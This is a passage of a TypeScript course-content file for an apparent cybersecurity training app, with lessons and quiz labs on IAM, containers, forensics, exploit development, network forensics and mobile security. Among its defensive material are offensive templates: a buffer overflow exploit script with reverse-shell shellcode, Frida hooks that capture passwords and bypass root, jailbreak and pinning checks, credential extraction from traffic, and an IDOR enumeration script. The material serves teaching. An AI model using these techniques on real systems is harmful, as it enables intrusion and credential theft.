    Version = "2012-10-17"
    Statement = [{
      Action = "sts:AssumeRole"
      Effect = "Allow"
      Principal = {
        Service = "lambda.amazonaws.com"
      }
    }]
  })
}

resource "aws_iam_role_policy" "lambda_policy" {
  name = "lambda-minimal-policy"
  role = aws_iam_role.lambda_role.id
  
  policy = jsonencode({
    Version = "2012-10-17"
    Statement = [{
      Effect = "Allow"
      Action = [
        "logs:CreateLogGroup",
        "logs:CreateLogStream",
        "logs:PutLogEvents"
      ]
      Resource = "arn:aws:logs:*:*:*"
    }]
  })
}`,
          liveLab: {
            id: 'lab-iam',
            title: 'Identify IAM Risk',
            description: 'Find the security issue in an IAM policy',
            difficulty: 'intermediate',
            challenge: 'This policy has a critical security issue: {"Effect":"Allow","Action":"s3:*","Resource":"*"}. What is the primary risk?',
            hint: 'Look at the Action and Resource - they are very broad...',
            solution: 'Overly permissive / allows all S3 actions on all buckets',
            validator: (input: string) => {
              const lower = input.toLowerCase();
              return lower.includes('permissive') || lower.includes('all') || lower.includes('wildcard') || lower.includes('*') || lower.includes('too broad');
            },
            completed: false,
            points: 75,
            timeEstimate: '15 min',
            skills: ['Cloud security', 'IAM', 'AWS']
          }
        },
        {
          id: 'cloud-2',
          title: 'Container Security',
          completed: false,
          keyPoints: [
            'Docker security hardening',
            'Kubernetes RBAC',
            'Image vulnerability scanning',
            'Runtime protection'
          ],
          content: `CONTAINER SECURITY

DOCKER SECURITY RISKS:
• Privileged containers
• Host filesystem mounts
• Exposed Docker socket
• Vulnerable base images
• Secrets in images
• Running as root

KUBERNETES SECURITY:
RBAC (Role-Based Access Control)
• Roles define permissions
• RoleBindings assign to users
• Namespace isolation

POD SECURITY:
• SecurityContext settings
• Network policies
• Resource limits
• Non-root users

IMAGE SECURITY:
• Scan for CVEs
• Use minimal base images
• Sign and verify images
• Regular updates

ATTACK SURFACES:
1. Container escape
2. Cluster compromise
3. Supply chain attacks
4. Misconfigurations`,
          codeExample: `# Secure Dockerfile
FROM node:18-alpine AS builder
WORKDIR /app
COPY package*.json ./
RUN npm ci --only=production

FROM node:18-alpine
# Create non-root user
RUN addgroup -g 1001 -S appgroup && \\
    adduser -S appuser -u 1001 -G appgroup
    
WORKDIR /app
COPY --from=builder /app/node_modules ./node_modules
COPY --chown=appuser:appgroup . .

# Remove shell access
RUN rm -rf /bin/sh /bin/ash

USER appuser
EXPOSE 3000
CMD ["node", "server.js"]

---
# Kubernetes Pod Security
apiVersion: v1
kind: Pod
metadata:
  name: secure-pod
spec:
  securityContext:
    runAsNonRoot: true
    runAsUser: 1001
    fsGroup: 1001
    seccompProfile:
      type: RuntimeDefault
  containers:
  - name: app
    image: myapp:latest
    securityContext:
      allowPrivilegeEscalation: false
      readOnlyRootFilesystem: true
      capabilities:
        drop:
          - ALL
    resources:
      limits:
        memory: "128Mi"
        cpu: "500m"
      requests:
        memory: "64Mi"
        cpu: "250m"

---
# Network Policy - Deny All, Allow Specific
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: deny-all
spec:
  podSelector: {}
  policyTypes:
  - Ingress
  - Egress`,
          liveLab: {
            id: 'lab-container',
            title: 'Container Security Flaw',
            description: 'Identify container misconfiguration',
            difficulty: 'intermediate',
            challenge: 'A Dockerfile contains: "docker run --privileged -v /:/host myimage". What TWO major security risks does this command introduce?',
            hint: 'Think about what --privileged does and what mounting / means...',
            solution: '1. Privileged mode (full host access), 2. Host filesystem mounted (can read/write everything)',
            validator: (input: string) => {
              const lower = input.toLowerCase();
              return (lower.includes('privileged') || lower.includes('root') || lower.includes('host access')) &&
                     (lower.includes('mount') || lower.includes('filesystem') || lower.includes('/'));
            },
            completed: false,
            points: 100,
            timeEstimate: '20 min',
            skills: ['Container security', 'Docker', 'Kubernetes']
          }
        }
      ]
    },
    {
      id: 'forensics-advanced',
      title: 'Advanced Forensics',
      description: 'Memory analysis, malware reverse engineering, and artifact recovery',
      icon: Microscope,
      color: 'text-purple-500',
      bgGradient: 'from-purple-500/20 to-violet-500/20',
      completed: false,
      category: 'advanced',
      estimatedTime: '6 hours',
      prerequisites: ['malware', 'response'],
      lessons: [
        {
          id: 'forensics-1',
          title: 'Memory Forensics Deep Dive',
          completed: false,
          keyPoints: [
            'Process analysis techniques',
            'Detecting process injection',
            'Network artifact extraction',
            'Malware deobfuscation in memory'
          ],
          content: `ADVANCED MEMORY FORENSICS

PROCESS ANALYSIS:
• EPROCESS structure walkthrough
• Hidden process detection
• Parent-child relationships
• Hollow processes

INJECTION TECHNIQUES:
1. DLL Injection
   • LoadLibrary abuse
   • Reflective loading

2. Process Hollowing
   • Create suspended process
   • Unmap legitimate code
   • Write malicious code
   • Resume execution

3. APC Injection
   • Asynchronous Procedure Call
   • Thread execution hijacking

DETECTION WITH VOLATILITY:
• malfind: Find injected code
• ldrmodules: Compare loaded DLLs
• hollowfind: Detect hollowing
• apihooks: Find API hooks

NETWORK ARTIFACTS:
• Open connections (netscan)
• Listening ports
• DNS cache
• Browser history in memory`,
          codeExample: `# Volatility 3 Memory Forensics Commands

# System Information
vol -f memory.raw windows.info

# Process Analysis
vol -f memory.raw windows.pslist
vol -f memory.raw windows.pstree
vol -f memory.raw windows.psscan  # Find hidden processes

# Detect Injection
vol -f memory.raw windows.malfind
vol -f memory.raw windows.ldrmodules  # DLL anomalies

# Network Connections
vol -f memory.raw windows.netscan
vol -f memory.raw windows.netstat

# Dump Process Memory
vol -f memory.raw windows.memmap --pid 1234 --dump

# Registry Analysis
vol -f memory.raw windows.registry.hivelist
vol -f memory.raw windows.registry.printkey --key "Software\\Microsoft\\Windows\\CurrentVersion\\Run"

# Command History
vol -f memory.raw windows.cmdline
vol -f memory.raw windows.consoles

# Custom Python Analysis
from volatility3.framework import contexts
from volatility3.plugins.windows import pslist, malfind

def hunt_injection(memory_file: str):
    """Hunt for process injection artifacts"""
    
    ctx = contexts.Context()
    # Setup context with memory file...
    
    suspicious = []
    
    for proc in pslist.PsList.run(ctx):
        # Check for memory regions with RWX permissions
        for vad in proc.get_vad_root().traverse():
            if vad.get_protection() == 'PAGE_EXECUTE_READWRITE':
                suspicious.append({
                    'pid': proc.UniqueProcessId,
                    'name': proc.ImageFileName,
                    'vad_start': hex(vad.get_start()),
                    'size': vad.get_end() - vad.get_start(),
                    'reason': 'RWX memory region'
                })
    
    return suspicious`
        },
        {
          id: 'forensics-2',
          title: 'Timeline Analysis',
          completed: false,
          keyPoints: [
            'Super timeline creation',
            'MFT analysis',
            'Registry timeline',
            'Log correlation'
          ],
          content: `FORENSIC TIMELINE ANALYSIS

SUPER TIMELINE:
Combine ALL time-based artifacts into single timeline:
• File system metadata
• Registry modifications
• Event logs
• Browser history
• Prefetch files
• Jump lists
• LNK files

KEY ARTIFACTS:

$MFT (Master File Table):
• File creation time
• Modification time
• Access time
• MFT entry change time
• Deleted file recovery

REGISTRY TIMESTAMPS:
• Key last modified
• User activity
• Software installation
• USB history

PREFETCH:
• Application execution times
• Run count
• Files accessed

SHELLBAGS:
• Folder access history
• Navigation patterns
• Remote shares accessed`,
          codeExample: `# Timeline Creation with Plaso/log2timeline

# Create timeline from disk image
log2timeline.py timeline.plaso disk_image.E01

# Parse specific artifacts
log2timeline.py --parsers 'win7,winevtx,prefetch' timeline.plaso image.E01

# Output to CSV
psort.py -o l2tcsv -w timeline.csv timeline.plaso

# Filter by date range
psort.py -o l2tcsv -w filtered.csv timeline.plaso \\
  "date > '2024-01-01' AND date < '2024-01-15'"

# Python: MFT Analysis
from analyzemft import mftsession

def analyze_mft(mft_file: str):
    """Parse MFT for forensic artifacts"""
    
    session = mftsession.MftSession()
    session.mft_options()
    session.open_files(mft_file)
    session.process_mft_file()
    
    suspicious_files = []
    
    for record in session.mft:
        # Find recently created executables
        if record['filename'].endswith('.exe'):
            created = record['fn_crtime']
            modified = record['fn_mtime']
            
            # Timestomping detection: 
            # Creation time after modification time is suspicious
            if created > modified:
                suspicious_files.append({
                    'filename': record['filename'],
                    'created': created,
                    'modified': modified,
                    'anomaly': 'Possible timestomping'
                })
    
    return suspicious_files`,
          liveLab: {
            id: 'lab-timeline',
            title: 'Timeline Anomaly Detection',
            description: 'Identify suspicious timeline patterns',
            difficulty: 'advanced',
            challenge: 'A file has: Created: 2024-06-15 10:00:00, Modified: 2024-01-01 08:00:00. What forensic anomaly does this indicate?',
            hint: 'How can a file be modified BEFORE it was created?',
            solution: 'Timestomping / timestamp manipulation',
            validator: (input: string) => {
              const lower = input.toLowerCase();
              return lower.includes('timestomp') || lower.includes('manipulat') || lower.includes('tamper') || lower.includes('anti-forensic');
            },
            completed: false,
            points: 100,
            timeEstimate: '20 min',
            skills: ['Forensics', 'Timeline analysis', 'Anti-forensics detection']
          }
        }
      ]
    },
    {
      id: 'exploit-dev',
      title: 'Exploit Development',
      description: 'Buffer overflows, shellcode, and exploit writing fundamentals',
      icon: Skull,
      color: 'text-rose-500',
      bgGradient: 'from-rose-500/20 to-red-500/20',
      completed: false,
      category: 'advanced',
      estimatedTime: '10 hours',
      prerequisites: ['malware', 'network-attacks'],
      lessons: [
        {
          id: 'exploit-1',
          title: 'Buffer Overflow Fundamentals',
          completed: false,
          keyPoints: [
            'Stack memory layout',
            'EIP control techniques',
            'Finding bad characters',
            'Return-to-libc attacks'
          ],
          content: `BUFFER OVERFLOW EXPLOITATION

MEMORY LAYOUT:
┌─────────────────┐ High Address
│      Stack      │ ← Local variables, return address
├─────────────────┤
│       ↓         │ Stack grows down
│       ↑         │ Heap grows up
├─────────────────┤
│      Heap       │ ← Dynamic allocation
├─────────────────┤
│      BSS        │ ← Uninitialized data
├─────────────────┤
│      Data       │ ← Initialized data
├─────────────────┤
│      Text       │ ← Code (read-only)
└─────────────────┘ Low Address

STACK FRAME:
┌─────────────────┐
│   Parameters    │
├─────────────────┤
│ Return Address  │ ← Target for overflow!
├─────────────────┤
│  Saved EBP      │
├─────────────────┤
│ Local Variables │ ← Buffer overflow starts here
└─────────────────┘

EXPLOITATION STEPS:
1. Crash the application
2. Find offset to EIP
3. Control EIP
4. Find space for shellcode
5. Handle bad characters
6. Generate shellcode
7. Get shell!

PROTECTIONS:
• ASLR: Address Space Layout Randomization
• DEP/NX: Non-executable stack
• Stack Canaries: Detect overwrites
• SafeSEH: Protected exception handlers`,
          codeExample: `# Buffer Overflow - Python Exploit Template
import socket
import struct

# Target configuration
TARGET_IP = "192.168.1.100"
TARGET_PORT = 9999

# Offset to EIP (found via pattern_offset)
OFFSET = 2006

# Return address (JMP ESP)
# Found via: !mona jmp -r esp -cpb "\\x00"
EIP = struct.pack("<I", 0x625011af)

# NOP sled
NOP = b"\\x90" * 16

# Shellcode (msfvenom -p windows/shell_reverse_tcp LHOST=... -b "\\x00")
SHELLCODE = (
    b"\\xdb\\xc0\\xd9\\x74\\x24\\xf4\\x5a\\x29\\xc9..."
    # Full shellcode here
)

# Build exploit
buffer = b"A" * OFFSET      # Padding to reach EIP
buffer += EIP               # Overwrite return address
buffer += NOP               # NOP sled
buffer += SHELLCODE         # Payload

# Send exploit
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((TARGET_IP, TARGET_PORT))
    s.send(buffer)
    s.close()
    print("[+] Exploit sent!")
except Exception as e:
    print(f"[-] Failed: {e}")

# Finding offset with msfvenom pattern
# pattern_create -l 3000
# pattern_offset -q <EIP_value>

# Finding bad characters
# Send all bytes 0x00-0xff and check which break`,
          liveLab: {
            id: 'lab-bof',
            title: 'Buffer Overflow Calculation',
            description: 'Calculate exploit parameters',
            difficulty: 'expert',
            challenge: 'You crashed an app with 3000 "A"s. EIP shows 0x41366641. Using Metasploit pattern_offset, the offset is 2003. How many bytes of padding do you need before the return address?',
            hint: 'The offset tells you exactly where EIP is overwritten...',
            solution: '2003',
            validator: (input: string) => input.trim() === '2003',
            completed: false,
            points: 150,
            timeEstimate: '30 min',
            skills: ['Exploit development', 'Buffer overflow', 'Binary exploitation']
          }
        }
      ]
    },
    // ============ NEW: NETWORK FORENSICS ============
    {
      id: 'network-forensics',
      title: 'Network Forensics',
      description: 'Packet analysis, traffic reconstruction, and network evidence collection',
      icon: Wifi,
      color: 'text-teal-500',
      bgGradient: 'from-teal-500/20 to-cyan-500/20',
      completed: false,
      category: 'defensive',
      estimatedTime: '5 hours',
      lessons: [
        {
          id: 'netforensics-1',
          title: 'Wireshark Deep Dive',
          completed: false,
          keyPoints: [
            'Capture filter vs display filter',
            'Protocol dissection',
            'Follow TCP/UDP streams',
            'Export objects from captures'
          ],
          content: `WIRESHARK PACKET ANALYSIS

CAPTURE FILTERS (BPF):
• host 192.168.1.1
• port 80 or port 443
• net 10.0.0.0/8
• tcp and port 22

DISPLAY FILTERS:
• ip.addr == 192.168.1.1
• tcp.port == 80
• http.request.method == "POST"
• dns.qry.name contains "malware"
• tcp.flags.syn == 1 && tcp.flags.ack == 0
• http.response.code >= 400

USEFUL TECHNIQUES:
1. Statistics → Conversations (identify top talkers)
2. Statistics → Protocol Hierarchy
3. Follow → TCP Stream (reassemble sessions)
4. File → Export Objects → HTTP (extract files)
5. Analyze → Expert Information

DETECTING ATTACKS:
• Port scan: Many SYN to different ports
• DNS tunnel: Large TXT records, odd domains
• C2: Beaconing patterns
• Exfiltration: Large outbound transfers`,
          codeExample: `# TShark Command Line Analysis
# Capture live traffic
tshark -i eth0 -w capture.pcap

# Read and filter
tshark -r capture.pcap -Y "http.request.method == POST"

# Extract HTTP URIs
tshark -r capture.pcap -Y "http" -T fields -e http.host -e http.request.uri

# DNS queries
tshark -r capture.pcap -Y "dns.flags.response == 0" -T fields -e dns.qry.name

# Find beaconing (time delta analysis)
tshark -r capture.pcap -Y "ip.dst == 10.10.10.10" -T fields -e frame.time_relative

# Python: Scapy Packet Analysis
from scapy.all import rdpcap, TCP, DNS

def analyze_pcap(file_path):
    packets = rdpcap(file_path)
    
    stats = {
        'total': len(packets),
        'tcp': 0,
        'dns_queries': [],
        'http_hosts': set()
    }
    
    for pkt in packets:
        if TCP in pkt:
            stats['tcp'] += 1
            
        if DNS in pkt and pkt.haslayer(DNS):
            if pkt[DNS].qr == 0:  # Query
                stats['dns_queries'].append(pkt[DNS].qd.qname.decode())
    
    return stats`,
          liveLab: {
            id: 'lab-wireshark',
            title: 'Wireshark Filter Challenge',
            description: 'Write effective display filters',
            difficulty: 'intermediate',
            challenge: 'Write a Wireshark display filter to find: HTTP POST requests to any domain containing "login" in the URI path.',
            hint: 'Combine http.request.method with http.request.uri and use "contains"...',
            solution: 'http.request.method == "POST" && http.request.uri contains "login"',
            validator: (input: string) => {
              const lower = input.toLowerCase();
              return lower.includes('post') && lower.includes('login') && (lower.includes('contains') || lower.includes('matches'));
            },
            completed: false,
            points: 75,
            timeEstimate: '15 min',
            skills: ['Wireshark', 'Packet analysis', 'Network forensics']
          }
        },
        {
          id: 'netforensics-2',
          title: 'C2 Traffic Detection',
          completed: false,
          keyPoints: [
            'Beaconing pattern analysis',
            'DNS tunneling detection',
            'HTTPS inspection challenges',
            'JA3/JA3S fingerprinting'
          ],
          content: `COMMAND & CONTROL TRAFFIC DETECTION

BEACONING INDICATORS:
• Regular time intervals
• Consistent payload sizes
• Low data volume
• Unusual ports/protocols
• Self-signed certificates

DETECTION TECHNIQUES:

1. TIME-BASED ANALYSIS
   Calculate inter-arrival times
   Low jitter = automated beaconing
   
2. DNS TUNNELING
   • Long subdomain names
   • High query frequency
   • TXT record responses
   • Entropy analysis
   
3. HTTPS ANOMALIES
   • JA3 fingerprint matching
   • Certificate validation
   • SNI vs certificate CN mismatch
   
4. STATISTICAL ANALYSIS
   • Bytes in vs bytes out ratio
   • Session duration
   • Connection frequency

JA3 FINGERPRINTING:
Hash of: TLS Version, Ciphers, Extensions, Curves, Point formats
Unique per client application!`,
          codeExample: `# Beaconing Detection with Python
import pandas as pd
import numpy as np
from collections import defaultdict

def detect_beaconing(connections):
    """Detect potential C2 beaconing patterns"""
    
    beacons = []
    
    # Group by destination
    by_dest = defaultdict(list)
    for conn in connections:
        by_dest[conn['dst_ip']].append(conn['timestamp'])
    
    for dst_ip, timestamps in by_dest.items():
        if len(timestamps) < 10:
            continue
            
        # Calculate inter-arrival times
        times = sorted(timestamps)
        deltas = [times[i+1] - times[i] for i in range(len(times)-1)]
        
        mean_delta = np.mean(deltas)
        std_delta = np.std(deltas)
        
        # Low standard deviation = consistent beaconing
        if std_delta < mean_delta * 0.1:  # Less than 10% jitter
            beacons.append({
                'dst_ip': dst_ip,
                'interval': mean_delta,
                'jitter': std_delta,
                'count': len(timestamps),
                'confidence': 'HIGH' if std_delta < mean_delta * 0.05 else 'MEDIUM'
            })
    
    return beacons

# DNS Tunneling Detection
def detect_dns_tunnel(dns_queries):
    """Detect potential DNS tunneling"""
    
    suspicious = []
    
    for query in dns_queries:
        domain = query['domain']
        subdomain = domain.split('.')[0]
        
        # Calculate entropy
        entropy = calculate_entropy(subdomain)
        
        if len(subdomain) > 30 and entropy > 3.5:
            suspicious.append({
                'domain': domain,
                'length': len(subdomain),
                'entropy': entropy,
                'reason': 'High entropy long subdomain'
            })
    
    return suspicious`,
          liveLab: {
            id: 'lab-c2-detect',
            title: 'C2 Beacon Analysis',
            description: 'Identify malicious traffic patterns',
            difficulty: 'advanced',
            challenge: 'Traffic shows connections to 45.33.32.156 every 60 seconds (±2sec) with 156 bytes each time. What THREE indicators suggest C2 beaconing?',
            hint: 'Consider regularity, consistency, and data patterns...',
            solution: '1. Regular interval (~60s), 2. Low jitter (±2s), 3. Consistent payload size (156 bytes)',
            validator: (input: string) => {
              const lower = input.toLowerCase();
              return (lower.includes('interval') || lower.includes('regular') || lower.includes('60')) &&
                     (lower.includes('jitter') || lower.includes('consistent') || lower.includes('size'));
            },
            completed: false,
            points: 100,
            timeEstimate: '20 min',
            skills: ['C2 detection', 'Network analysis', 'Threat hunting']
          }
        },
        {
          id: 'netforensics-3',
          title: 'Traffic Reconstruction',
          completed: false,
          keyPoints: [
            'Session reconstruction',
            'File carving from packets',
            'Email extraction',
            'VoIP call recovery'
          ],
          content: `NETWORK TRAFFIC RECONSTRUCTION

SESSION REASSEMBLY:
• TCP stream following
• HTTP object export
• SMB file extraction
• Email message recovery

TECHNIQUES:

1. FILE CARVING
   Extract files from packet data:
   • Images (JPEG, PNG, GIF)
   • Documents (PDF, DOCX)
   • Executables (PE, ELF)
   • Archives (ZIP, RAR)

2. EMAIL RECOVERY
   • SMTP traffic analysis
   • POP3/IMAP extraction
   • Attachment recovery
   • Header analysis for origin

3. CREDENTIAL CAPTURE
   • HTTP Basic Auth (Base64)
   • Form-based login data
   • FTP credentials
   • Telnet sessions

4. VoIP ANALYSIS
   • RTP stream extraction
   • SIP session parsing
   • Call metadata recovery
   • Audio playback

TOOLS:
• NetworkMiner (automatic extraction)
• Xplico (session reconstruction)
• Foremost (file carving)
• tcpflow (stream extraction)`,
          codeExample: `# NetworkMiner CLI alternative with Python
from scapy.all import rdpcap, TCP, Raw
import re

def extract_http_objects(pcap_file):
    """Extract HTTP objects from pcap"""
    
    packets = rdpcap(pcap_file)
    objects = []
    
    # Reassemble TCP streams
    streams = {}
    for pkt in packets:
        if TCP in pkt and Raw in pkt:
            key = (pkt[TCP].sport, pkt[TCP].dport)
            if key not in streams:
                streams[key] = b''
            streams[key] += bytes(pkt[Raw])
    
    # Find HTTP responses with content
    for stream_id, data in streams.items():
        if b'HTTP/' in data and b'Content-Type:' in data:
            # Extract content type
            ct_match = re.search(b'Content-Type: ([^\\r\\n]+)', data)
            if ct_match:
                content_type = ct_match.group(1).decode()
                
                # Find body (after double CRLF)
                body_start = data.find(b'\\r\\n\\r\\n') + 4
                if body_start > 4:
                    body = data[body_start:]
                    objects.append({
                        'stream': stream_id,
                        'content_type': content_type,
                        'size': len(body),
                        'data': body[:1000]  # First 1KB
                    })
    
    return objects

# Credential extraction
def extract_credentials(pcap_file):
    """Extract credentials from unencrypted traffic"""
    
    creds = []
    packets = rdpcap(pcap_file)
    
    for pkt in packets:
        if TCP in pkt and Raw in pkt:
            payload = bytes(pkt[Raw])
            
            # HTTP Basic Auth
            if b'Authorization: Basic' in payload:
                match = re.search(b'Basic ([A-Za-z0-9+/=]+)', payload)
                if match:
                    import base64
                    decoded = base64.b64decode(match.group(1))
                    creds.append({'type': 'HTTP Basic', 'value': decoded.decode()})
            
            # FTP credentials
            if pkt[TCP].dport == 21:
                if b'USER ' in payload or b'PASS ' in payload:
                    creds.append({'type': 'FTP', 'value': payload.decode(errors='ignore')})
    
    return creds`
        }
      ]
    },
    // ============ NEW: MOBILE SECURITY ============
    {
      id: 'mobile-security',
      title: 'Mobile Application Security',
      description: 'Android and iOS security testing, reverse engineering mobile apps',
      icon: Phone,
      color: 'text-emerald-500',
      bgGradient: 'from-emerald-500/20 to-green-500/20',
      completed: false,
      category: 'offensive',
      estimatedTime: '7 hours',
      lessons: [
        {
          id: 'mobile-1',
          title: 'Android Application Analysis',
          completed: false,
          keyPoints: [
            'APK structure and decompilation',
            'Manifest analysis',
            'Code review techniques',
            'Dynamic analysis with Frida'
          ],
          content: `ANDROID SECURITY ANALYSIS

APK STRUCTURE:
├── AndroidManifest.xml (permissions, components)
├── classes.dex (compiled Java/Kotlin code)
├── res/ (resources, layouts)
├── lib/ (native libraries)
├── assets/ (raw files)
└── META-INF/ (signatures)

STATIC ANALYSIS:

1. DECOMPILATION
   • jadx: DEX → Java source
   • apktool: Resource extraction
   • dex2jar: DEX → JAR

2. MANIFEST ANALYSIS
   • Exported components (activities, services)
   • Permission requests
   • Deep link handlers
   • Backup enabled?

3. CODE REVIEW
   • Hardcoded secrets/API keys
   • Insecure storage
   • SQL injection in ContentProviders
   • Weak cryptography

DYNAMIC ANALYSIS:

1. FRIDA (Runtime manipulation)
   • Hook functions
   • Bypass root detection
   • Extract runtime secrets
   
2. PROXY INTERCEPTION
   • Burp Suite + certificate pinning bypass
   • Traffic analysis

COMMON VULNERABILITIES:
• Insecure data storage
• Hardcoded credentials
• Exported components without protection
• Missing certificate pinning
• WebView vulnerabilities`,
          codeExample: `# Android Analysis Commands

# Decompile APK with jadx
jadx -d output_dir app.apk

# Extract with apktool
apktool d app.apk -o output_dir

# Search for hardcoded secrets
grep -rn "api_key\\|secret\\|password\\|token" output_dir/

# Check exported components
grep -E "android:exported=\"true\"" AndroidManifest.xml

# Frida Script: Hook function
// hook.js
Java.perform(function() {
    var MainActivity = Java.use("com.example.app.MainActivity");
    
    // Hook login method
    MainActivity.login.implementation = function(username, password) {
        console.log("Username: " + username);
        console.log("Password: " + password);
        
        // Call original method
        return this.login(username, password);
    };
    
    // Bypass root detection
    var RootCheck = Java.use("com.example.app.RootChecker");
    RootCheck.isRooted.implementation = function() {
        console.log("Root check bypassed!");
        return false;
    };
});

# Run Frida
frida -U -l hook.js com.example.app

# Certificate Pinning Bypass (Frida)
Java.perform(function() {
    var TrustManager = Java.use('javax.net.ssl.X509TrustManager');
    var SSLContext = Java.use('javax.net.ssl.SSLContext');
    
    // Custom TrustManager that trusts all certs
    var TrustAllCerts = Java.registerClass({
        name: 'com.bypass.TrustAllCerts',
        implements: [TrustManager],
        methods: {
            checkClientTrusted: function(chain, authType) {},
            checkServerTrusted: function(chain, authType) {},
            getAcceptedIssuers: function() { return []; }
        }
    });
});`,
          liveLab: {
            id: 'lab-android',
            title: 'APK Security Audit',
            description: 'Identify Android app vulnerabilities',
            difficulty: 'intermediate',
            challenge: 'AndroidManifest.xml shows: <activity android:name=".AdminActivity" android:exported="true"/>. What attack is possible and why?',
            hint: 'Exported activities can be started by any app on the device...',
            solution: 'Unauthorized access - any app can start AdminActivity directly bypassing authentication',
            validator: (input: string) => {
              const lower = input.toLowerCase();
              return (lower.includes('unauthorized') || lower.includes('bypass') || lower.includes('direct')) &&
                     (lower.includes('access') || lower.includes('start') || lower.includes('launch'));
            },
            completed: false,
            points: 75,
            timeEstimate: '15 min',
            skills: ['Android security', 'Mobile pentesting', 'Reverse engineering']
          }
        },
        {
          id: 'mobile-2',
          title: 'iOS Security Testing',
          completed: false,
          keyPoints: [
            'IPA structure analysis',
            'Binary analysis with Hopper',
            'Keychain data extraction',
            'Runtime manipulation with Cycript'
          ],
          content: `iOS SECURITY TESTING

IPA STRUCTURE:
├── Payload/
│   └── AppName.app/
│       ├── AppName (Mach-O binary)
│       ├── Info.plist
│       ├── embedded.mobileprovision
│       └── Resources/
└── iTunesArtwork

STATIC ANALYSIS:

1. BINARY ANALYSIS
   • class-dump (Objective-C headers)
   • Hopper/IDA (disassembly)
   • otool (dependencies, segments)

2. PLIST ANALYSIS
   • URL schemes
   • App Transport Security settings
   • Entitlements

3. STRING EXTRACTION
   • Hardcoded URLs/keys
   • Debug messages

DYNAMIC ANALYSIS:

1. OBJECTION (Frida-based)
   • iOS runtime exploration
   • Keychain dumping
   • Jailbreak bypass

2. CYCRIPT
   • JavaScript REPL
   • Method hooking
   • UI manipulation

COMMON VULNERABILITIES:
• Insecure local storage
• Weak ATS configuration
• Missing jailbreak detection
• Clipboard data leakage
• Sensitive data in logs`,
          codeExample: `# iOS Analysis Commands

# Extract IPA
unzip app.ipa -d extracted/

# Dump classes from binary
class-dump -H AppName -o headers/

# Check security features
otool -l AppName | grep -A4 LC_ENCRYPTION
# 0 = not encrypted, easy to analyze

# Check linked frameworks
otool -L AppName

# Objection: Explore iOS app
objection -g com.example.app explore

# Inside objection:
ios keychain dump
ios plist cat Info.plist
ios hooking list classes
ios hooking watch method "-[LoginViewController login:]" --dump-args

# Frida iOS Script
Java.perform(function() {
    // Hook Objective-C method
    var className = "LoginViewController";
    var methodName = "- validateCredentials:password:";
    
    var hook = ObjC.classes[className][methodName];
    Interceptor.attach(hook.implementation, {
        onEnter: function(args) {
            console.log("Username: " + ObjC.Object(args[2]));
            console.log("Password: " + ObjC.Object(args[3]));
        },
        onLeave: function(retval) {
            console.log("Result: " + retval);
            // Force return true
            retval.replace(1);
        }
    });
});

# Bypass Jailbreak Detection
ObjC.classes.JailbreakDetector.isJailbroken.implementation = function() {
    return false;
};`,
          liveLab: {
            id: 'lab-ios',
            title: 'iOS Security Check',
            description: 'Evaluate iOS app security',
            difficulty: 'advanced',
            challenge: 'Info.plist shows NSAllowsArbitraryLoads = YES under NSAppTransportSecurity. What security risk does this introduce?',
            hint: 'This setting affects how the app communicates over the network...',
            solution: 'Allows HTTP connections (no HTTPS required), enabling MITM attacks',
            validator: (input: string) => {
              const lower = input.toLowerCase();
              return (lower.includes('http') || lower.includes('unencrypted') || lower.includes('plain')) &&
                     (lower.includes('mitm') || lower.includes('intercept') || lower.includes('man-in-the-middle'));
            },
            completed: false,
            points: 100,
            timeEstimate: '20 min',
            skills: ['iOS security', 'Mobile pentesting', 'ATS bypass']
          }
        },
        {
          id: 'mobile-3',
          title: 'API Security Testing',
          completed: false,
          keyPoints: [
            'Intercepting mobile API traffic',
            'Authentication bypass techniques',
            'IDOR in mobile APIs',
            'Rate limiting and abuse'
          ],
          content: `MOBILE API SECURITY TESTING

INTERCEPTION SETUP:
1. Configure proxy (Burp/mitmproxy)
2. Install CA certificate on device
3. Bypass certificate pinning
4. Capture and modify requests

COMMON API VULNERABILITIES:

1. BROKEN AUTHENTICATION
   • Weak JWT implementation
   • Token leakage
   • Missing token expiration
   • Predictable tokens

2. IDOR (Insecure Direct Object Reference)
   • /api/users/123 → change to 124
   • UUID enumeration
   • Sequential IDs

3. MASS ASSIGNMENT
   POST /api/profile
   {"name": "Hacker", "role": "admin"}

4. RATE LIMITING ISSUES
   • Brute force possible
   • No exponential backoff
   • Missing CAPTCHA

5. DATA EXPOSURE
   • Verbose error messages
   • Debug endpoints in production
   • Sensitive data in responses

TESTING CHECKLIST:
□ Test with expired tokens
□ Modify user IDs in requests
□ Add extra parameters
□ Check for hidden endpoints
□ Test rate limits
□ Verify input validation`,
          codeExample: `# mitmproxy Script for API Analysis
from mitmproxy import http

def request(flow: http.HTTPFlow):
    # Log all API requests
    if "api" in flow.request.pretty_url:
        print(f"[{flow.request.method}] {flow.request.pretty_url}")
        
        # Check for sensitive headers
        auth = flow.request.headers.get("Authorization", "")
        if auth:
            print(f"  Auth: {auth[:50]}...")
        
        # Log POST body
        if flow.request.method == "POST":
            print(f"  Body: {flow.request.text[:200]}")

def response(flow: http.HTTPFlow):
    # Check for sensitive data in responses
    if "api" in flow.request.pretty_url:
        body = flow.response.text
        
        # Look for exposed sensitive data
        sensitive = ['password', 'secret', 'api_key', 'token', 'ssn']
        for word in sensitive:
            if word.lower() in body.lower():
                print(f"[!] Sensitive data '{word}' in response!")

# Python: IDOR Testing
import requests

def test_idor(base_url, auth_token, id_range):
    """Test for IDOR vulnerabilities"""
    
    results = []
    headers = {"Authorization": f"Bearer {auth_token}"}
    
    for user_id in id_range:
        url = f"{base_url}/api/users/{user_id}"
        response = requests.get(url, headers=headers)
        
        if response.status_code == 200:
            data = response.json()
            results.append({
                'id': user_id,
                'accessible': True,
                'data': data
            })
            print(f"[!] IDOR: Accessed user {user_id}")
    
    return results

# Test
test_idor("https://api.example.com", "my_token", range(1, 100))`,
          liveLab: {
            id: 'lab-api-security',
            title: 'API Vulnerability Hunt',
            description: 'Find mobile API security issues',
            difficulty: 'intermediate',
            challenge: 'Mobile app sends: GET /api/orders/12345. You change to /api/orders/12346 and see another users order. What vulnerability is this and how should it be fixed?',
            hint: 'The server is not validating ownership of the resource...',
            solution: 'IDOR vulnerability - fix by checking that the authenticated user owns the requested order',
            validator: (input: string) => {
              const lower = input.toLowerCase();
              return (lower.includes('idor') || lower.includes('insecure direct')) &&
                     (lower.includes('check') || lower.includes('verify') || lower.includes('validate') || lower.includes('owner'));
            },
            completed: false,
            points: 75,
            timeEstimate: '15 min',
